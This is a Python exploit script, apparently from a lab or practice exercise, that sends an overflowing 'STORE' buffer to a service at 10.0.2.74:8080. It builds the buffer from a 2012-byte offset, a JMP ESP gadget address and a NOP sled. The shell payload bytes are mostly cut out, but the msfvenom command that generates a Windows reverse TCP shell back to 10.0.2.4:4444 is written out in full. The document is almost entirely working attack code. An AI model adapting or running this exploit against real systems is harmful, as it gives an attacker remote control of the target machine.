#!/usr/bin/env python3
import socket
import time
import struct
__author__ = "oats"

target_ip = '10.0.2.74'
target_port = 8080

offset = 2012
buffer_size = 3000
badchars = [ 0x00 ]
esp_gadget_address = 0x6aea1413
esp_gadget = struct.pack("<I", esp_gadget_address)
NOP = b"\x90"

# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.4 LPORT=4444 -f py â€“e x86/shikata_ga_nai -b "\x00" -v payload
payload =  b""
payload += b"\xbf\xdd\xb0\xc7\xc5\xda\xdc\xd9\x74\x24\xf4\x5a" # ...
# ...
# omitted

buf = b""
buf += b"A" * offset
buf += esp_gadget
buf += NOP * 32
buf += payload
buf += b"D" * (buffer_size - len(buf))

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect((target_ip, target_port))
time.sleep(1)
print("Sending evil buffer")
s.send(b'STORE ' + buf)
s.close()
